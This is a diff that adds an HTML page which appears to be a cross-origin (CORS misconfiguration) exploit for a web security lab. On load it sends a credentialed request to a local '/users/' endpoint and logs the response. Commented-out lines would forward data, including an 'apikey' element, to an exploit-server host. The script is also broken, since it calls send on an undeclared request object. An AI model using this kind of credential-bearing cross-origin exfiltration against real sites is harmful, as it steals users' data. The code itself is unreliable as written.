@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <button type="button" onclick="sendRequest()">hiiiiiiii</button>
+        <script>
+           sendRequest()
+
+function sendRequest(){
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange= function(){
+
+        if(this.readyState==4 && this.status==200){
+           console.log("*********************")
+           console.log(this.responseText)
+            // var xhttp1 = new XMLHttpRequest();
+            // xhttp1.open("GET","https://exploit-0a34008204fdf1ffc03236f20180003b.exploit-server.net/exploit"+ "aaaaaaaaaaaaaaaaaaaa",true);
+          //  xhttp1.open("GET","http://127.0.0.3:8085/s/"+ document.getElementById("apikey"),true);
+  //  xhttp1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+   xhttp1.send("hhh");
+        }else{
+            console.log("*********************"+this.status)
+            console.log(this.responseText)
+        }
+
+    }
+   // xhttp.open("GET","https://cors-misconfig-3112.herokuapp.com/",true);
+  xhttp.open("GET","http://127.0.0.1:502/users/",true);
+
+  xhttp.withCredentials=true;
+    //xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    xhttp.send("hhh");
+ /////////////////////////////////////////////
+    // var xhttp2 = new XMLHttpRequest();
+    // xhttp2.open("GET","https://cors-misconfig-3112.herokuapp.com/",true);
+
+    // xhttp2.withCredentials=true;
+    // //xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    // xhttp2.send("hhh");
+// /////////////////////////////////////////
+//     var xhttp3 = new XMLHttpRequest();
+//     xhttp3.open("GET","https://exploit-0a34008204fdf1ffc03236f20180003b.exploit-server.net/exploit/aaaaaaaaaaaaaaaaaaaa",true);
+
+//     xhttp3.withCredentials=true;
+//     //xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+//     xhttp3.send("hhh");
+
+}
+        </script>
+    </body>
+</html>
